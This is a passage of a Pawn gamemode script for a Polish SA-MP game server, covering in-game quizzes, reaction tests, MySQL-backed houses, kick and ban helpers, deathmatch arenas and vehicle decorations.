	    case 1:
	    {
	    	new rand = random(80) + 1;
	        GivePlayerScore(playerid, rand);
	        format(strx, sizeof strx, ""C_O"Gracz "C_B"%s "C_O"znalaz³ walizkê! Wygra³: "C_B"%dexp", pName[playerid],rand);
	    }
	    case 2:
	    {
	        SetPlayerHealth(playerid, 100.0);
	        SetPlayerArmour(playerid, 100.0);
	        format(strx, sizeof strx, ""C_O"Gracz "C_B"%s "C_O"znalaz³ walizkê! Wygra³: "C_B"¯ycie + Armor",pName[playerid]);
	    }
	    case 3:
	    {
	        GivePlayerWeapon(playerid, 38, 5);
	        format(strx, sizeof strx, ""C_O"Gracz "C_B"%s "C_O"znalaz³ walizkê! Wygra³: "C_B"Miniguna z 5 nabojami",pName[playerid]);
	    }
	    case 4:
	    {
	    	KillPlayer(playerid);
	    	GivePlayerScore(playerid, 1);
	        format(strx, sizeof strx, ""C_O"Gracz "C_B"%s "C_O"znalaz³ walizkê! Wygra³: "C_B"Zgon przez randke z Boxxy.",pName[playerid]);
	    }
	    case 5:
	    {
			GivePlayerWeapon(playerid, 14, 1);
	        format(strx, sizeof strx, ""C_O"Gracz "C_B"%s "C_O"znalaz³ walizkê! Wygra³: "C_B"Kwiaty.",pName[playerid]);
	    }
	}
	Wwin++;
	if(Wwin == 6) Wwin = 0;

	SCMToAll(0x11BB11FF, strx);
	return 1;
}
forward cmd_ObliczDzialanie();
public cmd_ObliczDzialanie()
{
	new znaki[3] = {'+','-','*'};
	new l[3];
	new znak[2];

   	znak[0] = znaki[random(3)];
    znak[1] = znaki[random(3)];

    switch(znak[1])
	{
	    case '+': {
	        if(znak[0] == '+') { l[0] = random(90); l[1] = random(100); l[2] = random(95); ObliczWynik = (l[0]+l[1]+l[2]); }
	        if(znak[0] == '-') { l[0] = random(90); l[1] = random(100); l[2] = random(95); ObliczWynik = (l[0]-l[1]+l[2]); }
	        if(znak[0] == '*') { l[0] = random(20); l[1] = random(14); l[2] = random(15);  ObliczWynik = (l[0]*l[1]+l[2]); }
		}
		case '-': {
	        if(znak[0] == '+') { l[0] = random(90); l[1] = random(100); l[2] = random(95); ObliczWynik = (l[0]+l[1]-l[2]); }
	        if(znak[0] == '-') { l[0] = random(90); l[1] = random(100); l[2] = random(95); ObliczWynik = (l[0]-l[1]-l[2]); }
	        if(znak[0] == '*') { l[0] = random(20); l[1] = random(14); l[2] = random(15); ObliczWynik = (l[0]*l[1]-l[2]); }
		}
		case '/': {
	        if(znak[0] == '+') { l[0] = random(100); l[1] = random(20); l[2] = random(20); ObliczWynik = (l[0]+l[1]*l[2]); }
	        if(znak[0] == '-') { l[0] = random(100); l[1] = random(20); l[2] = random(20); ObliczWynik = (l[0]-l[1]*l[2]); }
	        if(znak[0] == '*') { l[0] = random(14); l[1] = random(10); l[2] = random(12); ObliczWynik = (l[0]*l[1]*l[2]); }
		}
	}

	format(strx, sizeof(strx), ""C_O"Pierwszy gracz, który jako pierwszy poda prawid³owy wynik dzia³ania "C_B"%d %c %d %c %d "C_O"otrzyma "C_B"10.000$ i 35 exp'a.", l[0], znak[0], l[1], znak[1], l[2]);
	SCMToAll(0xCC9966FF, strx);
	new mstr[64];
	format(mstr, 64, "Test matematyczny: ~r~%d %c %d %c %d", l[0], znak[0], l[1], znak[1], l[2]);

	TextDrawSetString(Matematyka, mstr);
	TextDrawShowForAll(Matematyka);
	ObliczStatus = true;
	SetTimer("DzialanieOff", 120000, 0);
	return 1;
}

forward DzialanieOff();
public DzialanieOff()
{
	if(ObliczStatus == false) return 1;

	SCMToAll(-1, ""C_O"Nikt nie poda³ prawid³owego wyniku dzia³ania. Kolejne dzia³anie ju¿ za kilka minut.");
	TextDrawHideForAll(Matematyka);
	ObliczWynik = 0;
	ObliczStatus = false;
	return 1;
}
forward ReactionTimeout();
public ReactionTimeout()
{
	KillTimer(TimerReaction);
	TimerReaction = SetTimer("ReactionTest", 420000, 0);
	TextDrawHideForAll(ReactionDraw);
	TestReaction = 0;
	return 1;
}
forward ReactionTest();
public ReactionTest()
{
	if(GetOnlinePlayers() == 0) return 1;

	KillTimer(TimerReaction);
	TimerReaction = SetTimer("ReactionTimeout",420000,0);
	TestReaction = 1;

	format(STRReaction, 10, "%c%c%c%c%c%c",
		Letters[random(60)],Letters[random(60)],Letters[random(60)],
		Letters[random(60)],Letters[random(60)],Letters[random(60)]);

	new mstr[64];
	format(mstr, 64, "Test reakcji: ~r~%s", STRReaction);

	TextDrawSetString(ReactionDraw, mstr);
	TextDrawShowForAll(ReactionDraw);
	return 1;
}
new gameshow[MAX_PLAYERS];
ShowGameDraw(playerid, message[], time)
{
	if(gameshow[playerid] != 0)
		KillTimer(gameshow[playerid]);

	gameshow[playerid] = SetTimerEx("RCDrawOff", time, 0, "d", playerid);
	TextDrawSetString(GameDraw[playerid], message);
	TextDrawShowForPlayer(playerid, GameDraw[playerid]);
	return 1;
}
forward RCDrawOff(playerid);
public RCDrawOff(playerid)
{
	gameshow[playerid] = 0;
	TextDrawHideForPlayer(playerid, GameDraw[playerid]);
	return 1;
}
stock GetVehicleID(const data[])
{
	new i = -1;
	while(++i < sizeof(VehicleNames))
	{
		if(!strcmp(VehicleNames[i], data, true)) return i + 400;
	}
	return 0;
}
LoadHouses()
{
	#define HOUSE_DAY 14
	HousePic[0] = CreatePickup(19132, 1, 2333,-1076.6999511719,1049, -1);
    HousePic[1] = CreatePickup(19132, 1, 2283.1000976563,-1139.8000488281,1050.9000244141, -1);
    HousePic[2] = CreatePickup(19132, 1, 2196.6999511719,-1204.4000244141,1049, -1);
    HousePic[3] = CreatePickup(19132, 1, 2308.8000488281,-1212.8000488281,1049, -1);
	HousePic[4] = CreatePickup(19132, 1, 2317.6999511719,-1026.5999755859,1050.1999511719, -1);
	HousePic[5] = CreatePickup(19132, 1, 2365.3000488281,-1135.5,1050.9000244141, -1);

	format(strx, sizeof strx, "SELECT `id`,`x`,`y`,`z`,`outx`,`outy`,`outz`,`outa`,`interior`,`owner`,`cost`,`name`,`time` FROM `house` LIMIT %d", MAX_HOUSES);
	mysql_query(strx);
	mysql_store_result();

	new rid, noowner[MAX_HOUSES];
	while(mysql_fetch_row(bstrx, "|"))
	{
	    new id, Float:x, Float:y, Float:z, Float:ox, Float:oy, Float:oz, Float:or, interior, owner[20], cost, name[40], time;
	    sscanf(bstrx, "p<|>ifffffffis[20]is[40]i", id, x, y, z, ox, oy, oz, or, interior, owner, cost, name, time);
	    HouseInfo[rid][hCP] = CreatePickup(1277, 1, x,y,z + 0.2, 0);

		if(owner[0] == '#' || gettime() > time + (24 * 60 * 60 * HOUSE_DAY))
		{
			format(strx, 120, ""C_O"Dom na sprzeda¿!*\n\n"C_O"Cena: "C_B"%d", cost);
			HouseInfo[rid][hLabel] = Create3DTextLabel(strx, -1, x,y,z + 1.5, 15.0, 0, 1);
		}else{
		   	format(strx, 120, ""C_B"%s"C_O"\n\n"C_O"W³aœciciel: "C_B"%s\n"C_O"Cena: "C_B"%d", name, owner, cost);
			HouseInfo[rid][hLabel] = Create3DTextLabel(strx, -1, x,y,z + 1.5, 15.0, 0, 1);

		}
        CreateDynamicMapIcon(x, y, z, 35, -1, 0, 0);

		HouseInfo[rid][hX] = x;
		HouseInfo[rid][hY] = y;
		HouseInfo[rid][hZ] = z;
		HouseInfo[rid][hOX] = ox;
		HouseInfo[rid][hOY] = oy;
		HouseInfo[rid][hOZ] = oz;
		HouseInfo[rid][hOA] = or;
		HouseInfo[rid][hInt] = interior;
		HouseInfo[rid][hID] = id;
		HouseInfo[rid][hCost] = cost;
		format(HouseInfo[rid][hOwner], 40, "%s", owner);
		format(HouseInfo[rid][hName], 40, "%s", name);

		if(gettime() > time + (24 * 60 * 60 * HOUSE_DAY) && owner[0] != '#')
		{
		    noowner[rid] = 1;
			format(HouseInfo[rid][hOwner], 40, "#");
			format(HouseInfo[rid][hName], 40, ""C_O"Dom na sprzeda¿!");
		}else noowner[rid] = 0;
		rid++;
		HouseCount++;
	}
	mysql_free_result();

	for(new i; i < sizeof noowner; i++)
	{
		if(noowner[i] == 1)
		{
		    format(bstrx, sizeof bstrx, "UPDATE `house` SET `owner` = '#', `name` = 'Dom na sprzeda¿!', `time` = '0' WHERE `id` = '%d'", HouseInfo[i][hID]);
			mysql_query(bstrx);
		}
	}
	printf("Loaded %d houses", rid);
	return 1;
}

TeleportToHouse(playerid, hid, owner)
{
	if(owner == 1)
		SCM(playerid, -1, ""C_O"Wpisz "C_B"/gospodarz"C_O", aby zarz¹dzaæ swoim domem.");

	SetPlayerInterior(playerid, housesInt[HouseInfo[hid][hInt]]);
	SetPlayerPos(playerid, hPos[HouseInfo[hid][hInt]][0],hPos[HouseInfo[hid][hInt]][1],hPos[HouseInfo[hid][hInt]][2]);
	SetPlayerFacingAngle(playerid, 0.0);
	SetPlayerVirtualWorld(playerid, 150 + hWorld);
	SetPVarInt(playerid, "inHouse", 1);
	SetPVarInt(playerid, "eHouseID", hid);

	hWorld++;
	if(hWorld == 49)
	{
	    hWorld = 0;
	}
	return 1;
}

ExitHousePlayer(playerid, hid)
{
	SetPlayerFacingAngle(playerid, HouseInfo[hid][hOA]);
    Spawned[playerid] = true;
	mysql_query("SELECT `x`,`y`,`z` FROM `spawn` WHERE `world` = 0 AND `interior` = 0 ORDER BY RAND() LIMIT 1");
	mysql_store_result();

	static name[30], X[12],Y[12],Z[12],A[12];
    mysql_fetch_field("name", name);
    mysql_fetch_field("x", X);
    mysql_fetch_field("y", Y);
    mysql_fetch_field("z", Z);
    mysql_fetch_field("rot", A);
    mysql_free_result();

    Streamer_UpdateEx(playerid, floatstr(X),floatstr(Y),floatstr(Z));
	SetPlayerPos(playerid, floatstr(X),floatstr(Y),floatstr(Z));
	SetPlayerFacingAngle(playerid, floatstr(A));
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);

	SetPVarInt(playerid, "eHouseID", -1);
	SetPVarInt(playerid, "inHouse", 0);
	SetPVarInt(playerid, "hZapro", -1);
	return 1;
}

GetPlayerFromNick(nick[])
{
	foreach (Player, i)
	{
		if(!strcmp(nick, pName[i])) return i;
	}
	return -1;
}
KickPlayer(playerid, admin[], reason[])
{
	new mstr[128];

	format(strx, sizeof strx, "Kick: %s (%d) - Admin: %s - Reason: %s", pName[playerid], playerid, admin, reason);
	WriteLog(strx);

	mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'kicks'");

	InfoBox(playerid, "Zosta³eœ wyrzucony z serwera!");
	if(GetPVarInt(playerid, "Logged") == 1)
	{
		format(mstr, 128, "{DD0000}Gracz {DDDDDD}%s{DD0000} zosta³ wyrzucony przez {DDDDDD}%s{DD0000}.", pName[playerid], admin);
		SCMToAll(0xDD0000FF, mstr);
		format(mstr, 128, "Powód: {DDDDDD}%s {DD0000}.", reason);
		SCMToAll(0xDD0000FF, mstr);
	}
	Kick(playerid);
	return 1;
}
BanPlayer(playerid, admin[], reason[])
{
	new mstr[256], ip[24];
	GetPlayerIp(playerid, ip, 24);

	format(strx, sizeof strx, "Ban: %s (%d) - Admin: %s - Reason: %s", pName[playerid], playerid, admin, reason);
	WriteLog(strx);

	format(mstr, 256, "INSERT INTO `bans` (`nick`,`ip`,`date`,`admin`,`reason`) VALUES ('%s','%s','%d.%s.%dr.','%s','%s')", pName[playerid], ip, day, namemonth[month-1], year, admin, reason);
	mysql_query(mstr);

	InfoBox(playerid, "Zosta³eœ zbanowany!");
	if(GetPVarInt(playerid, "Logged") == 1)
	{
		format(mstr, 256, "{DD0000}Gracz {DDDDDD}%s{DD0000} zosta³ zbanowany przez {DDDDDD}%s{DD0000}.", pName[playerid], admin);
		SCMToAll(0xEE0000FF, mstr);
		format(mstr, 256, "Powód: {DDDDDD}%s {DD0000}.", reason);
		SCMToAll(0xEE0000FF, mstr);
	}
	Kick(playerid);

	mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'bans'");
	return 1;
}

IsPlayerFight(playerid)
{
	if(pAntyTele[playerid][0] == -1)
	    return 0;

	if(!IsPlayerConnected(pAntyTele[playerid][0]))
	    return 0;

	if(GetPlayerVirtualWorld(pAntyTele[playerid][0]) != GetPlayerVirtualWorld(playerid))
	    return 0;

	if(PlayerToPlayer(playerid, pAntyTele[playerid][0], 100.0) == 0)
	{
	    if(pAntyTele[pAntyTele[playerid][0]][0] == playerid) pAntyTele[pAntyTele[playerid][0]][0] = -1;
	    pAntyTele[playerid][0] = -1;
	    return 0;
	}
	if(pAntyTele[playerid][1] < GetTickCount() - 15000)
	{
	    if(pAntyTele[pAntyTele[playerid][0]][0] == playerid) pAntyTele[pAntyTele[playerid][0]][0] = -1;
	    pAntyTele[playerid][0] = -1;
		return 0;
	}
	return 1;
}

PlayerToPlayer(playerid, targetid, Float:dist)
{
    static Float:PTPpos[3];
    GetPlayerPos(targetid, PTPpos[0], PTPpos[1], PTPpos[2]);
    return IsPlayerInRangeOfPoint(playerid, dist, PTPpos[0], PTPpos[1], PTPpos[2]);
}
ClearAllFun(i)
{
	SetPVarInt(i, "pZapisanyHAY", 0);
	SetPVarInt(i, "pZapisanyCH", 0);
	SetPVarInt(i, "pZapisanySS", 0);
	SetPVarInt(i, "pZapisanyDD", 0);
	SetPVarInt(i, "pZapisanyTW", 0);
    SetPVarInt(i, "pZapisanyWG", 0);
    UpdateFunTextDraw();
	return 1;
}

DeathMatch(playerid, arena)
{
	if(IsPlayerFight(playerid) == 1)
		return SCM(playerid, -1, ""C_B"Najpierw dokoñcz walke!");

	if(pInFun[playerid] == 1 && GetPVarInt(playerid, "pDM") == 0) return 0;

	if(GetPVarInt(playerid, "pDM") == 0) SCM(playerid, -1, ""C_O"Aby wyjœæ ze strefy DM wpisz "C_B"/exitdm");

	ResetPlayerWeapons(playerid);
	SetPlayerHealth(playerid, 100.0);
	SetPlayerArmour(playerid, 0.0);
    ClearAllFun(playerid);

	switch(arena)
	{
	    case 4:
	    {
	        new r = random(sizeof Spawn_SNP);
	        SetPlayerPos(playerid, Spawn_SNP[r][0],Spawn_SNP[r][1],Spawn_SNP[r][2] + 2.0);
	        SetPlayerVirtualWorld(playerid, 14);
	        SetPlayerInterior(playerid, 0);
	    }
	    case 3:
	    {
   	        new r = random(sizeof Spawn_JP);
	        SetPlayerPos(playerid, Spawn_JP[r][0],Spawn_JP[r][1],Spawn_JP[r][2] + 1.0);
	        SetPlayerVirtualWorld(playerid, 13);
	        SetPlayerInterior(playerid, 0);
	    }
	    case 2:
	    {
   	        new r = random(sizeof Spawn_OS);
	        SetPlayerPos(playerid, Spawn_OS[r][0],Spawn_OS[r][1],Spawn_OS[r][2] + 1.0);
	        SetPlayerVirtualWorld(playerid, 12);
	        SetPlayerInterior(playerid, 0);
	    }
	    case 1:
	    {
   	        new r = random(sizeof Spawn_RPG);
	        SetPlayerPos(playerid, Spawn_RPG[r][0],Spawn_RPG[r][1],Spawn_RPG[r][2] + 2.0);
	        SetPlayerVirtualWorld(playerid, 11);
	        SetPlayerInterior(playerid, 0);
	    }
	    case 0:
	    {
   	        new r = random(sizeof Spawn_RPG);
	        SetPlayerPos(playerid, Spawn_RPG[r][0],Spawn_RPG[r][1],Spawn_RPG[r][2] + 2.0);
	        SetPlayerVirtualWorld(playerid, 10);
	        SetPlayerInterior(playerid, 0);
	    }
	}
	switch(arena)
	{
	    case 0: GivePlayerWeapon(playerid, 35, 1500);
	    case 1: GivePlayerWeapon(playerid, 38, 5000);
	    case 2: GivePlayerWeapon(playerid, 24, 1500);
	    case 3: GivePlayerWeapon(playerid, 32, 9999), SetPlayerSpecialAction(playerid, 2);
	    case 4: GivePlayerWeapon(playerid, 34, 1500);
	}
	SetPVarInt(playerid, "pDM", arena +1); //+1
	pInFun[playerid] = 1;

	pLoop(i)
	{
		ShowPlayerNameTagForPlayer(playerid, i, 0);
	}
	SetPVarInt(playerid, "ShowNickOff", 1);
	return 1;
}

ExitDM(playerid)
{
	if(GetPVarInt(playerid, "pDM") == 0)
	    return 0;

	if(IsPlayerFight(playerid) == 1)
		return SCM(playerid, -1, ""C_B"Najpierw dokoñcz walke!");

	SetPVarInt(playerid, "pDM", 0);
	pInFun[playerid] = 0;
	ResetPlayerWeapons(playerid);
	SetPlayerVirtualWorld(playerid, 0);
	SpawnPlayer(playerid);

	pLoop(i)
	{
		ShowPlayerNameTagForPlayer(playerid, i, 1);
	}
	SetPVarInt(playerid, "ShowNickOff", 0);
	return 1;
}

Odstaw(playerid)
{
    SetPlayerPos(playerid,GetPVarFloat(playerid, "floX"),GetPVarFloat(playerid, "floY"),GetPVarFloat(playerid, "floZ"));
    SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "floVW"));
    SetPlayerInterior(playerid, GetPVarInt(playerid, "floInt"));

	SetPlayerColor(playerid, playerColors[playerid]);
	SetPlayerTeam(playerid, NO_TEAM);

    ResetPlayerWeapons(playerid);
	SetPlayerHealth(playerid, 100.0);

    if(GetPVarInt(playerid, "floVW") != 26)
	{
		GiveStandartWeapon(playerid);
	}else GivePlayerWeapon(playerid, 24, 999);

	SetPVarInt(playerid, "floInt", 0);
	SetPVarInt(playerid, "floVW", 0);
	return 1;
}

IsPlayerAFK(i)
{
	if(IsPlayerConnected(i) == 0)
	    return 1;

    if(GetPlayerState(i) == 0 || GetPlayerState(i) > 7)
        return 1;

	if(pLastUpdate[i] > 10)
	    return 1;

	return pAFK[i];
}
UpdateFunTextDraw()
{
	new WG, CH, SS, DD, HAY, TW;
	pLoop(i)
	{
	    if(IsPlayerConnected(i))
	    {
		    if(GetPVarInt(i, "pZapisanyWG") == 1)
		    {
		        WG++;
		    }
		    if(GetPVarInt(i, "pZapisanyCH") == 1)
		    {
		        CH++;
		    }
		    if(GetPVarInt(i, "pZapisanySS") == 1)
		    {
		        SS++;
		    }
		    if(GetPVarInt(i, "pZapisanyDD") == 1)
		    {
		        DD++;
		    }
		    if(GetPVarInt(i, "pZapisanyHAY") == 1)
		    {
		        HAY++;
		    }
			if(GetPVarInt(i, "pZapisanyTW") == 1)
		    {
		        TW++;
		    }
	    }
	}
	WG_Zapisanych = WG;
	CH_Zapisanych = CH;
	SS_Zapisanych = SS;
	DD_Zapisanych = DD;
	HAY_Zapisanych = HAY;
	TW_Zapisanych = TW;

	new mstr[64];
	if(WG_Trwa == 0)
	{
		format(mstr, 64, "/WG - ~r~~h~%d/4", WG);
		TextDrawSetString(FunDraw[0], mstr);
	}else TextDrawSetString(FunDraw[0], "/WG - ~r~~h~Trwa");

	if(CH_Trwa == 0)
	{
		format(mstr, 64, "/CH - ~r~~h~%d/4", CH);
		TextDrawSetString(FunDraw[1], mstr);
	}else TextDrawSetString(FunDraw[1], "/CH - ~r~~h~Trwa");

	if(SS_Trwa == 0)
	{
		format(mstr, 64, "/SS - ~r~~h~%d/2", SS);
		TextDrawSetString(FunDraw[2], mstr);
	}else TextDrawSetString(FunDraw[2], "/SS - ~r~~h~Trwa");

	if(HAY_Trwa == 0)
	{
		format(mstr, 64, "/HY - ~r~~h~%d/3", HAY);
		TextDrawSetString(FunDraw[3], mstr);
	}else TextDrawSetString(FunDraw[3], "/HY - ~r~~h~Trwa");

	if(TW_Trwa == 0)
	{
		format(mstr, 64, "/TW - ~r~~h~%d/3", TW);
		TextDrawSetString(FunDraw[4], mstr);
	}else TextDrawSetString(FunDraw[4], "/TW - ~r~~h~Trwa");

 	if(DD_Trwa == 0)
	{
		format(mstr, 64, "/DD - ~r~~h~%d/4", DD);
		TextDrawSetString(FunDraw[5], mstr);
	}else TextDrawSetString(FunDraw[5], "/DD - ~r~~h~Trwa");

	return 1;
}
UpdateFunStat(fun[], saved)
{
	new mstr[128], param[11], rekord;
	format(mstr, 128, "SELECT `value` FROM `stats` WHERE `name` = 'r%s'", fun);
	mysql_query(mstr);
	mysql_store_result();
	mysql_fetch_field("value", param);
	mysql_free_result();

	rekord = strval(param);

	if(rekord < saved)
	{
        format(mstr, 128, "UPDATE `stats` SET `value` = '%d' WHERE `name` = 'r%s'", saved, fun);
		mysql_query(mstr);
	}
    format(mstr, 128, "UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'c%s'", fun);
	mysql_query(mstr);
	return 1;
}
IsNumberEven(number) {
  new remainder = number % 2;
  if(remainder > 0) return false;
  else return true;
}
IsPlayerInDM(playerid)
{
	if(IsPlayerInDynamicArea(playerid, DM_Zone[0])
		|| IsPlayerInDynamicArea(playerid, DM_Zone[1])
		|| IsPlayerInDynamicArea(playerid, DM_Zone[2])
		|| IsPlayerInDynamicArea(playerid, DM_Zone[3])
		|| IsPlayerInDynamicArea(playerid, DM_Zone[4]) ) return 1;

	return 0;
}

WriteLog(const log[])
{
	static wl_date[3], wl_time[3], wl_str[160], wl_file[32];

   	getdate(wl_date[0], wl_date[1], wl_date[2]);
   	gettime(wl_time[0], wl_time[1], wl_time[2]);

	format(wl_str, sizeof wl_str, "[%02d:%02d:%02d] %s\r\n", wl_time[0], wl_time[1], wl_time[2], log);
	format(wl_file, sizeof wl_file, "logs/%d.%d.%d.txt", wl_date[0], wl_date[1], wl_date[2]);

	if(!fexist(wl_file))
	{
	    new File:cfile = fopen(wl_file, io_readwrite);
		fwrite(cfile, "");
		fclose(cfile);
	}
	new File:flog = fopen(wl_file, io_append);
	fwrite(flog, wl_str);
	fclose(flog);
	return 1;
}
new LabiryntOBJ[197];
CreateLabitynt()
{
	new Float:angles[4] = {0.0, 90.0, -90.0, 180.0};
	new Float:x = 2230.0;
	new Float:y = 2874.0;
	new obj;

	for(new i; i < 14; i++)
	{
	    x = 2230.0;
	    for(new o; o < 14; o++)
	    {
			LabiryntOBJ[obj] = CreateDynamicObject(3095, x,y, 1241.90, 0.00, 90.00, angles[random(sizeof angles)]);
			obj++;
            x = x - 9;
		}
		y = y - 9;
	}
	printf("Labirynt: %d", obj+1);
	return 1;
}
forward Labirynt();
public Labirynt()
{
	new Float:angles[4] = {0.0, 90.0, -90.0, 180.0};
	for(new i; i < sizeof LabiryntOBJ; i++)
	{
	    SetDynamicObjectRot(LabiryntOBJ[i], 0.0, 90.0, angles[random(sizeof angles)]);
	}
	return 1;
}
IsAllowWeapon(wid)
{
	for(new i; i < sizeof AllowWeapon; i++)
	{
		if(AllowWeapon[i] == wid) return 1;
	}
	return 0;
}
stock IsTir(model)
{
	switch(model)
	{
	    case 403: return 1;
	    case 514: return 1;
	    case 515: return 1;
	}
	return 0;
}
stock IsCiezarowka(model)
{
	switch(model)
	{
	    case 499: return 1;
	    case 422: return 1;
	    case 482: return 1;
	    case 498: return 1;
	    case 609: return 1;
	    case 524: return 1;
	    case 455: return 1;
	    case 414: return 1;
	    case 600: return 1;
	    case 413: return 1;
	    case 440: return 1;
	    case 543: return 1;
	    case 459: return 1;
	    case 478: return 1;
	    case 456: return 1;
	    case 433: return 1;
	}
	return 0;
}
stock RandomLadunek(id)
{
	new rand = id;
	while(rand == id)
	{
		rand = random(TrucksCount);
	}
	return rand;
}
stock SetIcon(playerid, Float:x, Float:y, Float:z, iconid, type, color = 0x00000000)
{
	RemovePlayerMapIcon(playerid, 99);
	SetPlayerMapIcon(playerid, 99,x,y,z,iconid, color,type);
	return 1;
}

forward Float:PointToPoint(Float:x, Float:y, Float:x2, Float:y2);
stock Float:PointToPoint(Float:x, Float:y, Float:x2, Float:y2)
    return floatsqroot((x2-x)*(x2-x)+(y2-y)*(y2-y));

stock TuneObjectVehicle(vehicleid)
{
	new i = GetVehicleModel(vehicleid);

	if(vObject[vehicleid][0] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][0]);
	    vObject[vehicleid][0] = -1;
	}
	if(vObject[vehicleid][1] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][1]);
	    vObject[vehicleid][1] = -1;
	}

	switch(i)
	{
	    case 522:
        {
            vObject[vehicleid][0] = CreateDynamicObject(18702, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0],vehicleid, 0.00,-1.125000,-1.049999,0.00,0.00,0.00);
            vObject[vehicleid][1] = CreateDynamicObject(1019, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][1],vehicleid, 0.000000,-0.3,0.225,-18.9,0.0,0.0);
			return 1;
        }
        case 562:
        {
            vObject[vehicleid][0] = CreateDynamicObject(18646, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
        	AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, -0.225000,-0.150000,0.824999,0.00,0.00,0.00);
        	return 1;
        }
        case 411:
		{
		    vObject[vehicleid][0] = CreateDynamicObject(3267, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
        	AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, 0.000000, -0.1275, 0.105, 0.0, 0.0, 0.0);
        	return 1;
		}
		case 470:
		{
			vObject[vehicleid][0] = CreateDynamicObject(2985, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, 1.065, 0.774, 0.155, 90.45, -0.0, 89.44);
			return 1;
		}
		case 539:
		{
			vObject[vehicleid][0] = CreateDynamicObject(18782, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, -0.435, 0.0, 0.585, 0.0, 0.0, 0.0);
			return 1;
		}
		case 560:
		{
			vObject[vehicleid][0] = CreateDynamicObject(1003, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, 0.0,-1.2,0.6,0.0,0.0,0.0);
			return 1;
		}
		case 587:
		{
			vObject[vehicleid][0] = CreateDynamicObject(1012, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, 0.0,1.2,0.225,0.0,0.0,0.0);
			vObject[vehicleid][1] = CreateDynamicObject(1003, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][1], vehicleid, 0.0,-2.325,0.225,0.0,0.0,0.0);
			return 1;
		}
		case 451:
		{
			vObject[vehicleid][0] = CreateDynamicObject(1006, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, 0.225,-0.2250,0.525,0.0,0.0,0.0);
			vObject[vehicleid][1] = CreateDynamicObject(1006, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][1], vehicleid, -0.225,-0.225,0.525,0.0,0.0,0.0);
			return 1;
		}
		case 540:
		{
			vObject[vehicleid][0] = CreateDynamicObject(362, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, -0.0,-0.3,1.0,-0.0,30.0,90.0);
			return 1;
		}//
		case 482:
		{
			vObject[vehicleid][0] = CreateDynamicObject(2232, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, -0.0,0.0,-0.0,0.0,0.0,180.0);
			vObject[vehicleid][1] = CreateDynamicObject(1016, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][1], vehicleid, 0.0,0.0,0.0,-25.0,0.0,0.0);
			return 1;
		}
		case 549:
		{
			vObject[vehicleid][0] = CreateDynamicObject(728, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, 0.0,0.0,-1.35,0.0,0.0,0.0);
			vObject[vehicleid][1] = CreateDynamicObject(728, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][1], vehicleid, 0.075,-1.05,-1.35,0.0,0.0,-202.5);
			return 1;
		}
		case 535:
		{
			vObject[vehicleid][0] = CreateDynamicObject(19128, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid, 0.0,0.0,-0.7,0.0,0.0,0.0);
			vObject[vehicleid][1] = CreateDynamicObject(370, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][1], vehicleid, 0.0,-1.725,0.15,-90.0,0.0,0.0);
			return 1;
		}
		case 431:
		{
			vObject[vehicleid][0] = CreateDynamicObject(18651, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][0], vehicleid,  0.0,0.0,2.175,0.0,0.0,0.0);
			vObject[vehicleid][1] = CreateDynamicObject(18646, 0.0, 0.0, -1000.0, 0, 0, 0, 0, 0, -1, 100.0);
			AttachDynamicObjectToVehicle(vObject[vehicleid][1], vehicleid,0.0,2.0,2.175,0.0,0.0,0.0);
			return 1;
		}
	}
	return 0;
}
stock ToTime(sec)
{
	new h, m;
	m = sec;
	while (m >= 60)
	{
		h++;
		m -= 60;
	}
	new xstr[1000];
	format(xstr, 16, "~g~%d~r~:~g~%02d", h, m);
	return xstr;
}


stock mysql_PlayerSet(player[], key[], value[]) {
	new nick[30], string2[300];

	mysql_real_escape_string(player, nick);

